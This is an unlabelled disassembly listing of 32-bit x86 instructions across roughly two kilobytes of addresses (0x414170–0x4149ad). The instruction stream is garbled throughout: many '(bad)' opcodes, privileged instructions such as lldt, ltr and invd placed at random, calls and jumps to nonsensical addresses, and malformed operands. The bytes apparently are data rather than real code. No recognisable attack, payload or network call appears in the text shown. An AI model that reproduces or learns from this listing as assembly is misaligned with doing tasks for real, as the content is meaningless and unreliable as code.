  414170:	or     al,0x5e
  414172:	inc    eax
  414173:	add    BYTE PTR [ebx],al
  414175:	data16 and BYTE PTR [ebp+0x50],al
  414179:	sub    DWORD PTR [ecx],0xfffffff8
  41417c:	add    BYTE PTR [ebp-0x75],ah
  41417f:	add    BYTE PTR [eax],bl
  414181:	enter  0x894d,0x8b
  414185:	int3   
  414186:	loopne 0x41414a
  414188:	rol    BYTE PTR [eax],0x33
  41418b:	lea    cx,[ebp+0xa]
  41418f:	data16 jb 0x4141d7
  414192:	add    BYTE PTR [ebx+0x44890855],cl
  414198:	sbb    ah,al
  41419a:	inc    ebp
  41419b:	lldt   WORD PTR ds:[edx+0x66]
  4141a0:	xor    ecx,DWORD PTR [eax]
  4141a2:	sub    eax,DWORD PTR [ebx+ecx*4]
  4141a5:	add    BYTE PTR [esi+eiz*2],cl
  4141a8:	ror    edx,cl
  4141aa:	dec    ebp
  4141ab:	inc    ebp
  4141ac:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4141b2:	cld    
  4141b3:	or     BYTE PTR [edi+0x4501dd],dl
  4141b9:	(bad)  
  4141ba:	into   
  4141bb:	out    dx,al
  4141bc:	retf   
  4141bd:	(bad)  
  4141be:	dec    ebp
  4141bf:	mov    al,0x8b
  4141c1:	loop   0x4141e3
  4141c3:	cmp    ecx,DWORD PTR [edx]
  4141c5:	inc    ebp
  4141c6:	daa    
  4141c7:	loop   0x414150
  4141c9:	out    dx,al
  4141ca:	add    edi,eax
  4141cc:	add    BYTE PTR [eax+0x3f52e155],bh
  4141d2:	push   ebp
  4141d3:	inc    ebp
  4141d4:	xor    ebx,esp
  4141d6:	add    ebp,esi
  4141d8:	push   edx
  4141d9:	push   bp
  4141db:	inc    ebp
  4141dc:	(bad)  
  4141dd:	in     eax,dx
  4141de:	push   esp
  4141df:	(bad)  
  4141e0:	inc    edx
  4141e2:	sbb    al,0x33
  4141e4:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4141eb:	add    BYTE PTR [ebp+0x47],0x8b
  4141ef:	jmp    0xf98b:0x100041c8
  4141f6:	xor    esi,DWORD PTR [edx+0x3]
  4141f9:	mov    ecx,DWORD PTR [edi]
  4141fb:	fmul   DWORD PTR [edx]
  4141fd:	add    BYTE PTR [eax],al
  4141ff:	lea    eax,[ebx-0x4700273c]
  414205:	add    al,0x4f
  414207:	pop    DWORD PTR [eax]
  414209:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  41420f:	push   edx
  414210:	inc    WORD PTR [ebp+0x8]
  414214:	mov    eax,0x514f4d
  414219:	(bad)
  41421d:	add    al,al
  41421f:	xor    DWORD PTR [ebx-0x74baf730],eax
  414225:	test   DWORD PTR [esi+0x74],esp
  414228:	inc    ebp
  414229:	mov    DWORD PTR [eax+0xa4e08],edi
  41422f:	add    BYTE PTR [ecx-0x76c435bb],cl
  414235:	or     dh,cl
  414237:	or     eax,0x8b8d5045
  41423c:	inc    ebp
  41423d:	mov    WORD PTR [ecx+0x3b8a00],?
  414243:	jne    0x414278
  414245:	mov    edi,DWORD PTR [edx+0x8f3b18]
  41424b:	add    DWORD PTR [ebx],eax
  41424d:	add    bh,bh
  41424f:	adc    DWORD PTR [eax],ecx
  414251:	adc    DWORD PTR [ebp+0x55],edi
  414254:	push   es
  414255:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  41425b:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  414262:	inc    ebp
  414263:	mov    esp,edi
  414265:	or     al,0xdc
  414267:	push   eax
  414268:	(bad)  
  414269:	jne    0x41421f
  41426b:	call   0x393b5c
  414270:	inc    ebp
  414271:	sar    BYTE PTR [edx],0x84
  414274:	out    dx,al
  414275:	add    bh,al
  414277:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41427e:	(bad)  
  41427f:	and    al,al
  414281:	fs in  eax,dx
  414283:	inc    DWORD PTR [ebp-0x7b]
  414286:	jo     0x414297
  414288:	leave  
  414289:	scas   al,BYTE PTR es:[edi]
  41428a:	inc    esp
  41428b:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  414292:	or     BYTE PTR [ebx-0x97717c9],0x83
  414299:	call   DWORD PTR [edi]
  41429b:	shr    ah,0x84
  41429e:	xchg   DWORD PTR [eax],eax
  4142a0:	add    DWORD PTR [eax],eax
  4142a2:	add    bh,bh
  4142a4:	dec    ebp
  4142a5:	and    BYTE PTR [ecx-0x38],dl
  4142a8:	push   eax
  4142a9:	dec    DWORD PTR [ebx+0xfd885]
  4142af:	mov    BYTE PTR [ebp+0x508bac00],cl
  4142b5:	mov    WORD PTR [ecx+0x0],ss
  4142b8:	lea    ecx,[ebx+0x108b20d8]
  4142be:	mov    WORD PTR [edx],ds
  4142c0:	add    BYTE PTR [edi+0xff01ff],al
  4142c6:	mov    ecx,DWORD PTR [ebp-0x28]
  4142c9:	push   ecx
  4142ca:	shl    BYTE PTR [ebp+0x3a],0x8b
  4142ce:	inc    ebp
  4142cf:	in     al,0xeb
  4142d1:	jno    0x41425e
  4142d3:	push   edx
  4142d4:	mov    DWORD PTR [eax-0x28],edx
  4142d7:	mov    eax,DWORD PTR [ebp+0x20]
  4142da:	je     0x414263
  4142dc:	mov    eax,DWORD PTR [ecx]
  4142de:	sbb    BYTE PTR [eax],al
  4142e0:	pop    DWORD PTR [eax]
  4142e2:	add    esi,eax
  4142e4:	add    bl,al
  4142e6:	adc    DWORD PTR [edi],esi
  4142e8:	jmp    0x8bcc933a
  4142ed:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4142f4:	jne    0x414281
  4142f6:	mov    ecx,DWORD PTR [eax]
  4142f8:	in     al,0x75
  4142fa:	pop    DWORD PTR [ecx+0x5501]
  414300:	push   edx
  414301:	inc    DWORD PTR [ebx]
  414303:	adc    BYTE PTR [ecx+0x45721cc6],cl
  414309:	add    BYTE PTR [edi+0x9],dl
  41430c:	call   DWORD PTR [esi]
  41430e:	and    dl,al
  414310:	and    bh,bh
  414312:	inc    edi
  414314:	test   eax,edx
  414316:	sldt   ebx
  414319:	xor    BYTE PTR [eax],al
  41431b:	pushf  
  41431c:	(bad)  
  41431d:	jmp    0x41432b
  41431f:	mov    eax,edi
  414321:	or     al,0x75
  414323:	inc    eax
  414324:	call   0x413a2c
  414329:	mov    eax,eax
  41432b:	loopne 0x4142b1
  41432d:	inc    ebp
  41432e:	add    BYTE PTR [ebx+0x1451c00],cl
  414334:	mov    eax,DWORD PTR [ebp+0x20]
  414337:	add    edi,ecx
  414339:	add    BYTE PTR [eax],ch
  41433b:	cmp    edi,0x18
  41433e:	test   DWORD PTR [ebp+0xf],esi
  414341:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  414348:	jne    0x41434c
  41434a:	call   0xffa03e0f
  41434f:	leave  
  414350:	rcr    BYTE PTR [esp+eax*4],0x55
  414354:	add    ah,ch
  414356:	add    BYTE PTR [edi-0x48fef979],dh
  41435c:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  414363:	inc    esp
  414364:	mov    ebx,DWORD PTR [eax]
  414366:	fcom   st(2)
  414368:	add    BYTE PTR [edi],bl
  41436a:	lea    ecx,[eax-0x18]
  41436d:	(bad)  
  41436e:	push   DWORD PTR [ecx]
  414370:	call   0xffb390d2
  414375:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  414379:	fstp   DWORD PTR [esi+ebx*8]
  41437c:	push   ebp
  41437d:	pop    ebp
  41437e:	mov    esi,DWORD PTR [edx-0x38]
  414381:	add    DWORD PTR [eax],0x28
  414384:	mov    edi,DWORD PTR [ebx]
  414386:	xor    esi,DWORD PTR [edx+0x3]
  414389:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  41438d:	pop    ebp
  41438e:	or     al,0x4
  414390:	inc    ecx
  414391:	push   ebp
  414392:	(bad)  
  414393:	in     al,dx
  414394:	or     ah,ch
  414396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414397:	xbegin 0xffc6b98d
  41439d:	clc    
  41439e:	adc    al,0x45
  4143a0:	div    BYTE PTR [eax]
  4143a2:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4143a9:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  4143b0:	jno    0x414418
  4143b2:	add    eax,DWORD PTR [ebp+0x52]
  4143b5:	adc    eax,0xffffffa0
  4143b8:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4143be:	test   DWORD PTR [eax],eax
  4143c0:	clc    
  4143c1:	data16 or al,BYTE PTR [ebp+0x45]
  4143c5:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4143cc:	rol    BYTE PTR [ebp+0x45],1
  4143cf:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4143d5:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4143db:	push   ebx
  4143dc:	add    BYTE PTR [ebp+0x0],dl
  4143df:	push   ecx
  4143e0:	jge    0x414415
  4143e2:	add    BYTE PTR [esi+0x4],dl
  4143e5:	jne    0x41444c
  4143e7:	mov    edx,0x457200
  4143ec:	jmp    0x4143b0
  4143ee:	xor    edi,DWORD PTR [ebx]
  4143f0:	pop    edi
  4143f1:	cvtdq2ps xmm7,xmm0
  4143f4:	ret    0x0
  4143f7:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4143fd:	xor    ecx,DWORD PTR [edi]
  4143ff:	add    eax,DWORD PTR [ecx+0x3b]
  414402:	push   ebx
  414403:	rdpmc  
  414405:	out    0x8d,al
  414407:	add    BYTE PTR [eax],cl
  414409:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  41440f:	ret    0x450c
  414412:	sbb    al,0x8b
  414414:	cmp    eax,esi
  414416:	or     cl,al
  414418:	or     al,0xc2
  41441a:	pop    eax
  41441b:	inc    ebp
  41441c:	add    ecx,DWORD PTR [edi]
  41441e:	add    esi,DWORD PTR [ebp+0x39]
  414421:	invd   
  414423:	jge    0x41442f
  414425:	mov    eax,0x478ac0
  41442a:	cli    
  41442b:	xor    esp,ecx
  41442d:	mov    ebx,0x5b8ac0
  414432:	ret    0x33
  414435:	mov    eax,0x833b8b
  41443a:	sub    BYTE PTR [ebx],al
  41443c:	inc    ebp
  41443d:	xor    ax,di
  414440:	pushf  
  414441:	inc    bh
  414443:	mov    esp,esp
  414445:	hlt    
  414446:	test   DWORD PTR [ebp-0x8],esi
  414449:	mov    eax,DWORD PTR [ebp-0x14]
  41444c:	xor    ecx,DWORD PTR [ebx-0x76478864]
  414452:	dec    edi
  414453:	or     BYTE PTR [eax],al
  414455:	jne    0x4143e0
  414457:	mov    esi,esp
  414459:	call   0x77a7d01e
  41445e:	inc    ebp
  41445f:	mov    DWORD PTR [eax+0x9c4f0c],edi
  414465:	add    BYTE PTR [ecx-0x3ffe0717],cl
  41446b:	add    BYTE PTR [esi+0x7d],ah
  41446e:	inc    ebp
  41446f:	mov    bx,WORD PTR [ebp+0x8]
  414473:	add    DWORD PTR [ebp+0x55],0x30c008b
  41447a:	inc    ebp
  41447b:	mov    bx,di
  41447e:	lock test BYTE PTR [ecx+0x7000801],bh
  414485:	jge    0x414448
  414487:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  41448d:	cli    
  41448e:	xor    bl,bh
  414490:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  414496:	test   BYTE PTR [eax],cl
  414498:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  41449f:	cmp    ebp,eax
  4144a1:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4144a8:	test   BYTE PTR [ebp+0x1],bh
  4144ab:	mov    ebx,0x458a00
  4144b0:	xor    esi,DWORD PTR [ebx]
  4144b2:	add    esp,DWORD PTR [esi-0x77]
  4144b5:	pop    ebp
  4144b6:	loopne 0x41451e
  4144b8:	inc    ebp
  4144b9:	clc    
  4144ba:	xor    edi,DWORD PTR [ebx]
  4144bc:	add    esi,DWORD PTR [edx-0x77]
  4144bf:	data16 fdivr QWORD PTR [ebp-0x49]
  4144c3:	mov    ebx,0xb78afc
  4144c8:	hlt    
  4144c9:	xor    edi,DWORD PTR [esi]
  4144cb:	data16 add BYTE PTR [ebp+0x66],bl
  4144cf:	data16 lock clc 
  4144d2:	cmp    eax,DWORD PTR ds:[eax]
  4144d5:	ja     0x41453d
  4144d7:	psubq  mm7,QWORD PTR [ebp+0x4]
  4144db:	ltr    WORD PTR [ebp+0x66]
  4144df:	add    esi,eax
  4144e1:	add    di,WORD PTR [ebp+0x2b]
  4144e5:	data16 data16 jge 0x414566
  4144e9:	mov    ebx,0xe08a8b
  4144ee:	jge    0x414523
  4144f0:	data16 data16 xor al,0x5d
  4144f4:	data16 data16 jne 0x4144f0
  4144f8:	mov    edi,DWORD PTR [ebx]
  4144fa:	fdiv   QWORD PTR [edx+0x7d]
  4144fd:	data16 data16 jge 0x414535
  414501:	mov    ebx,0x758a66
  414506:	mov    esi,0x667233
  41450b:	pop    ebp
  41450c:	or     BYTE PTR [esi+0x0],ah
  41450f:	clc    
  414510:	mov    edi,DWORD PTR [ebx]
  414512:	lock ja 0x4144a0
  414515:	(bad)  
  414517:	jge    0x414510
  414519:	invd   
  41451b:	pop    ebp
  41451c:	add    BYTE PTR [ebx],al
  41451e:	(bad)  
  41451f:	cmp    di,WORD PTR [ebp+0xf]
  414523:	data16 sbb bh,BYTE PTR [ebp+0x0]
  414527:	mov    bx,WORD PTR [ebp-0x10]
  41452b:	pop    bp
  41452d:	fbstp  TBYTE PTR [ebx]
  41452f:	test   DWORD PTR [ebx],eax
  414531:	add    BYTE PTR [ebx],bh
  414533:	add    BYTE PTR [esi+0x7d],ah
  414536:	jge    0x4144c3
  414538:	data16 in al,dx
  41453a:	pop    ebp
  41453b:	stc    
  41453c:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  414543:	mov    edi,ebx
  414545:	in     al,dx
  414546:	test   BYTE PTR [ebp+0x0],bh
  414549:	mov    eax,DWORD PTR [eax]
  41454b:	call   0xbd3e3edb
  414550:	ds pushf 
  414552:	add    BYTE PTR [edx],dh
  414554:	mov    bx,di
  414557:	call   0x8b49c2e7
  41455c:	add    ebp,esp
  41455e:	mov    bx,di
  414561:	jnp    0x414589
  414563:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  414569:	mov    eax,DWORD PTR [eax]
  41456b:	call   0x7c3cd0d6
  414570:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  414576:	data16 data16 fistp WORD PTR [ebp+0xe]
  41457b:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  414585:	fisttp WORD PTR [ecx-0x7401f77b]
  41458b:	(bad)  
  41458c:	cld    
  41458d:	jne    0x4145cd
  41458f:	xor    eax,DWORD PTR [eax]
  414591:	mov    esp,DWORD PTR [esi-0x10]
  414594:	sti    
  414595:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  41459c:	data16 adc bl,bh
  41459f:	push   ebp
  4145a0:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  4145a7:	mov    WORD PTR [eax],es
  4145a9:	pushf  
  4145aa:	data16 xor bh,bl
  4145ad:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4145b3:	mov    esp,DWORD PTR [esi-0x14]
  4145b6:	fisttp WORD PTR [ebx-0x3748a9f2]
  4145bc:	or     al,0x2b
  4145be:	mov    bh,0xba
  4145c0:	hlt    
  4145c1:	mov    bh,bl
  4145c3:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4145c9:	dec    esi
  4145ca:	or     al,0x0
  4145cc:	mov    edi,DWORD PTR [ebx]
  4145ce:	or     BYTE PTR [ebp+0x3b],dh
  4145d1:	mov    ecx,DWORD PTR [edi]
  4145d3:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4145d9:	xor    al,0xd8
  4145db:	pop    bp
  4145dd:	lock xor esi,DWORD PTR [ebx]
  4145e0:	lea    esp,[esi+0x1f]
  4145e3:	icebp  
  4145e4:	jb     0x4145ea
  4145e6:	add    al,al
  4145e8:	jge    0x4145f6
  4145ea:	mov    eax,eax
  4145ec:	fsubr  st,st(3)
  4145ee:	pop    ebp
  4145ef:	mov    esi,DWORD PTR [ebx]
  4145f1:	in     al,0x8d
  4145f3:	rcr    DWORD PTR [edi],0xc2
  4145f6:	jb     0x414656
  4145f8:	add    cl,cl
  4145fa:	jge    0x414608
  4145fc:	mov    edx,DWORD PTR [ebp-0x20]
  4145ff:	in     al,dx
  414600:	pop    ebp
  414601:	data16 data16 or BYTE PTR [esi+edi*4],bh
  414606:	cmp    di,WORD PTR [ebp+0x0]
  41460a:	mov    ebp,DWORD PTR [ebx]
  41460c:	fdivr  QWORD PTR [esi+0x668a5d]
  414612:	cmp    al,0x33
  414614:	mov    si,0x4e7d
  414618:	mov    eax,DWORD PTR [eax]
  41461a:	lock inc ebp
  41461c:	mov    esi,DWORD PTR [esi]
  41461e:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  414625:	clc    
  414626:	(bad)  
  414627:	cmp    edi,DWORD PTR [ebx]
  414629:	je     0x41463a
  41462b:	push   ebx
  41462c:	loopne 0x41463d
  41462e:	dec    ecx
  414630:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  414634:	icebp  
  414635:	mov    esi,0x703084d
  41463a:	pcmpgtd mm6,mm1
  41463d:	add    BYTE PTR [ebp+0x66],dh
  414640:	jmp    0x41460d
  414642:	mov    eax,DWORD PTR [ebx]
  414644:	lock push ebp
  414646:	ror    DWORD PTR [ebp-0x2972feb3],1
  41464c:	or     bh,dl
  41464e:	jb     0x41464e
  414650:	add    BYTE PTR [ebx-0x1a7487b3],cl
  414656:	loopne 0x414658
  414658:	jne    0x41465e
  41465a:	data16 add BYTE PTR [esi+eiz*2],dh
  41465e:	mov    ecx,ebx
  414660:	data16 ds icebp 
  414663:	add    BYTE PTR [esi],bh
  414665:	data16 add bl,cl
  414668:	retw   0xf2
  41466c:	ret    0x66
  41466f:	retf   
  414670:	enterw 0x4df1,0x19
  414675:	pop    edi
  414676:	jne    0x4145f9
  414678:	mov    esi,DWORD PTR [esi]
  41467a:	call   0x77b5d21b
  41467f:	xor    ebp,DWORD PTR [ebx]
  414681:	lea    esp,[esi+0x48]
  414684:	repnz in eax,0x3b
  414687:	add    BYTE PTR [ebp-0x37],dh
  41468a:	xor    edx,DWORD PTR [ebp-0x15]
  41468d:	in     al,dx
  41468e:	xor    edx,DWORD PTR [esi+0x40]
  414691:	mov    DWORD PTR [edi],0x338545fc
  414697:	clc    
  414698:	add    esi,DWORD PTR [ecx]
  41469a:	pop    edi
  41469b:	pushf  
  41469c:	pop    ebx
  41469d:	call   0xff424664
  4146a2:	mov    edi,eax
  4146a4:	push   ecx
  4146a5:	pop    es
  4146a6:	mov    esi,DWORD PTR [edi]
  4146a8:	push   esi
  4146a9:	inc    edi
  4146aa:	add    al,0x70
  4146ac:	add    BYTE PTR [ecx+0x66],ah
  4146af:	(bad)  
  4146b0:	into   
  4146b1:	fs ds int 0x0
  4146b5:	mov    ecx,0x7ce0866
  4146ba:	ret    0x66
  4146bd:	add    bh,al
  4146bf:	add    al,0xfc
  4146c1:	add    BYTE PTR [ebp+0x31c3f866],al
  4146c7:	ds pushf 
  4146c9:	add    BYTE PTR [esi+0x66],ah
  4146cc:	into   
  4146cd:	ret    
  4146ce:	pop    ebp
  4146cf:	adc    al,0x57
  4146d1:	add    BYTE PTR [edi-0x723c409a],dh
  4146d7:	add    edi,edi
  4146d9:	jne    0x414730
  4146db:	lea    edx,[ecx+0x1]
  4146de:	mov    ebx,0xd64ff1
  4146e3:	sar    DWORD PTR [ebx],1
  4146e5:	test   BYTE PTR [ebp+0x38],dh
  4146e8:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4146ec:	push   edi
  4146ed:	xor    BYTE PTR [ebx],0x37
  4146f0:	mov    esi,ebx
  4146f2:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  4146f8:	cmp    BYTE PTR [ebp+0x64],al
  4146fb:	pop    ebx
  4146fc:	mov    ebx,0x9c3b36
  414701:	je     0x41472e
  414703:	xor    edi,DWORD PTR [ebx+0x668a33]
  414709:	mov    WORD PTR [ebx],?
  41470b:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  414711:	pop    edi
  414712:	cmp    ecx,ecx
  414714:	jne    0x41476b
  414716:	mov    ebp,esp
  414718:	cld    
  414719:	push   esi
  41471a:	pop    ebx
  41471b:	inc    ebp
  41471c:	stc    
  41471d:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  414725:	clc    
  414726:	test   dl,dl
  414728:	cmp    bh,bh
  41472a:	fs pop si
  41472d:	or     bl,al
  41472f:	add    al,0x8b
  414731:	add    BYTE PTR [ecx+0x66],dl
  414734:	push   edi
  414735:	retf   0x3e45
  414738:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  414740:	clc    
  414741:	add    BYTE PTR [ebx+0x66],bl
  414744:	dec    edx
  414746:	mov    edx,DWORD PTR [edi-0x76]
  414749:	push   edi
  41474a:	add    al,0xb7
  41474c:	xor    al,0xba
  41474e:	cmp    al,0x8d
  414750:	je     0x414751
  414752:	mov    edx,DWORD PTR [ebp-0x46]
  414755:	push   ecx
  414756:	lea    edi,[ebx+0x554fff]
  41475c:	push   ecx
  41475d:	cmp    edx,DWORD PTR [ebx+0x75]
  414760:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  414766:	add    BYTE PTR [ebx],dh
  414768:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  41476e:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  414775:	mov    ebx,0x3b3b00
  41477a:	jne    0x4147a7
  41477c:	mov    DWORD PTR [ebx+0x728afc],edi
  414782:	xor    esi,DWORD PTR [ebx]
  414784:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  41478a:	push   edi
  41478b:	cmp    esp,ebp
  41478d:	jne    0x41478f
  41478f:	sbb    DWORD PTR [eax],0x8085c3fc
  414795:	clc    
  414796:	inc    edi
  414797:	pop    ebx
  414798:	sti    
  414799:	add    eax,0xeb8bc075
  41479e:	cld    
  41479f:	xor    edi,DWORD PTR ds:0xf8c3855e
  4147a5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4147a8:	rol    DWORD PTR [ebp-0x37],0xf
  4147ac:	mov    DWORD PTR [eax],ecx
  4147ae:	inc    edi
  4147af:	(bad)  
  4147b0:	in     eax,0xfc
  4147b2:	add    bh,bh
  4147b4:	(bad)  
  4147b5:	mov    esi,0xc38a5e
  4147ba:	mov    esi,DWORD PTR [ebx]
  4147bc:	push   ecx
  4147bd:	mov    edi,0xfc4ec7
  4147c2:	test   DWORD PTR [ebp-0x8],edx
  4147c5:	xor    di,ax
  4147c8:	pushf  
  4147c9:	sub    ebp,eax
  4147cb:	inc    ebp
  4147cc:	(bad)  
  4147cd:	sub    edi,edi
  4147cf:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4147d5:	inc    ebp
  4147d6:	add    BYTE PTR [esi+0x2b],ah
  4147d9:	or     bh,BYTE PTR [edx+0xf8ac2]
  4147df:	cmp    al,0x33
  4147e1:	mov    edi,DWORD PTR [edx+0xfc4e81]
  4147e7:	(bad)  
  4147e8:	cmp    esi,DWORD PTR [ebx]
  4147ea:	je     0x4147a4
  4147ec:	push   ebx
  4147ed:	dec    esi
  4147ee:	str    ecx
  4147f1:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  4147f5:	xor    edi,DWORD PTR [edi+0x789085f]
  4147fb:	mov    edx,DWORD PTR [esp+edi*8]
  4147fe:	add    cl,cl
  414800:	data16 add al,0xcb
  414803:	push   ebp
  414804:	add    ebp,esp
  414806:	jne    0x4147f4
  414808:	(bad)  
  414809:	mov    DWORD PTR [ecx],0xd685f7ec
  41480f:	clc    
  414810:	xlat   BYTE PTR ds:[ebx]
  414811:	inc    ebp
  414812:	mov    esi,DWORD PTR [eax]
  414814:	push   eax
  414815:	pushf  
  414816:	in     eax,0x8b
  414818:	add    ah,ch
  41481a:	add    al,0x55
  41481c:	add    BYTE PTR [ecx+0x66],dl
  41481f:	add    eax,0x3e72cb
  414824:	add    BYTE PTR [ebp+0x66],al
  414827:	(bad)  
  414828:	retf   
  414829:	lock ret 0x85
  41482d:	clc    
  41482e:	inc    bp
  414830:	retf   
  414831:	cmp    eax,0xc77d9cc8
  414836:	ss cld 
  414838:	pushf  
  414839:	test   DWORD PTR [edi-0x8],ebx
  41483c:	je     0x414883
  41483e:	xor    esi,DWORD PTR ds:0x7020840
  414844:	ror    BYTE PTR [ebp-0x37],0x8d
  414848:	push   ebp
  414849:	add    esp,ebp
  41484b:	jb     0x4147d8
  41484d:	add    BYTE PTR [eax],cl
  41484f:	dec    ebp
  414850:	mov    bh,0x81
  414852:	push   esi
  414853:	push   ebp
  414854:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  41485b:	xor    al,BYTE PTR [eax]
  41485d:	mov    edx,DWORD PTR [edi+0x10]
  414860:	(bad)  
  414861:	scas   eax,DWORD PTR es:[edi]
  414862:	ret    0x3b
  414865:	jns    0x3b424558
  41486b:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  41486f:	dec    ebp
  414870:	or     BYTE PTR [ebx],ch
  414872:	ret    0x458b
  414875:	lock jmp 0x414869
  414878:	mov    ecx,DWORD PTR [eax]
  41487a:	or     BYTE PTR [edi],al
  41487c:	mov    ecx,eax
  41487e:	xor    DWORD PTR [edx+0x2],0x0
  414882:	mov    bh,0xc1
  414884:	adc    BYTE PTR [eax],dh
  414886:	iret   
  414887:	inc    ebp
  414888:	mov    DWORD PTR [ebx],0x4dfff8c4
  41488e:	inc    BYTE PTR [ebx]
  414890:	ret    0xf8
  414893:	adc    DWORD PTR [esi+0x10],esp
  414896:	clc    
  414897:	dec    ecx
  414898:	fisttp WORD PTR [ecx+0x456604c0]
  41489e:	add    dh,BYTE PTR ds:0x75e0845
  4148a4:	ret    0x4d
  4148a7:	lea    ecx,[ebx+0x18728301]
  4148ad:	add    BYTE PTR [ebp+0x45],al
  4148b0:	xor    ecx,ebp
  4148b2:	pushf  
  4148b3:	add    bh,al
  4148b5:	add    al,ch
  4148b7:	inc    ebp
  4148b8:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4148be:	xor    eax,0x781084d
  4148c3:	push   ebp
  4148c4:	pushf  
  4148c5:	push   ecx
  4148c6:	xor    al,BYTE PTR [ecx+0x32f89c89]
  4148cc:	inc    ebp
  4148cd:	cmp    edi,DWORD PTR [ecx]
  4148cf:	jbe    0x41486d
  4148d1:	mov    eax,edi
  4148d3:	or     ah,dh
  4148d5:	inc    ebp
  4148d6:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4148dc:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4148e2:	in     al,dx
  4148e3:	hlt    
  4148e4:	push   ebp
  4148e5:	push   ebp
  4148e6:	push   ecx
  4148e7:	push   ecx
  4148e8:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4148ee:	pushf  
  4148ef:	pushf  
  4148f0:	xor    dh,BYTE PTR [edx]
  4148f2:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4148f8:	or     BYTE PTR [ebp+0x7],al
  4148fb:	mov    eax,ecx
  4148fd:	clc    
  4148fe:	jb     0x4148c1
  414900:	add    BYTE PTR [ebp+0x55],cl
  414903:	or     DWORD PTR [edi],0xc251d155
  414909:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  414913:	mov    edi,eax
  414915:	or     cl,al
  414917:	inc    ebp
  414918:	dec    ebp
  414919:	mov    eax,DWORD PTR [ecx+0x514d550c]
  41491f:	or     WORD PTR [ecx],0x899c
  414924:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  41492a:	mov    edx,DWORD PTR [ecx+0x8]
  41492d:	mov    eax,DWORD PTR [ebp-0x8]
  414930:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  414937:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  41493d:	inc    ebp
  41493e:	dec    eax
  41493f:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  414945:	add    edx,DWORD PTR [ecx-0x8]
  414948:	mov    ecx,DWORD PTR [ecx]
  41494a:	clc    
  41494b:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  414952:	mov    ecx,ebp
  414954:	clc    
  414955:	(bad)  
  414956:	popf   
  414957:	inc    DWORD PTR [eax]
  414959:	ret    0x8b
  41495c:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  414962:	mov    edi,esp
  414964:	hlt    
  414965:	test   ecx,esi
  414967:	clc    
  414968:	or     BYTE PTR [ebp+0x7],al
  41496b:	xor    cl,al
  41496d:	pushf  
  41496e:	jb     0x4149a3
  414970:	add    BYTE PTR [eax-0x3f],al
  414973:	inc    eax
  414974:	daa    
  414975:	inc    ebp
  414976:	inc    ebp
  414977:	xor    eax,0x7f80803
  41497c:	dec    ebp
  41497d:	pushf  
  41497e:	add    esi,DWORD PTR [edx]
  414980:	clc    
  414981:	cmp    DWORD PTR [ecx],ecx
  414983:	or     al,0x8
  414985:	add    al,BYTE PTR [ebp+0x2c]
  414988:	xor    eax,0x7350845
  41498d:	or     BYTE PTR [ebp+0x7],cl
  414990:	lea    ebx,[ecx+eax*1+0x8b7232]
  414997:	or     al,0x45
  414999:	enter  0x4deb,0x8b
  41499d:	mov    edx,DWORD PTR [eax]
  41499f:	cld    
  4149a0:	dec    ebp
  4149a1:	push   ebp
  4149a2:	sub    edx,DWORD PTR [ecx-0x75]
  4149a5:	add    eax,0xf172fc
  4149aa:	or     BYTE PTR [ebp+0x7],cl
  4149ad:	add    eax,ecx
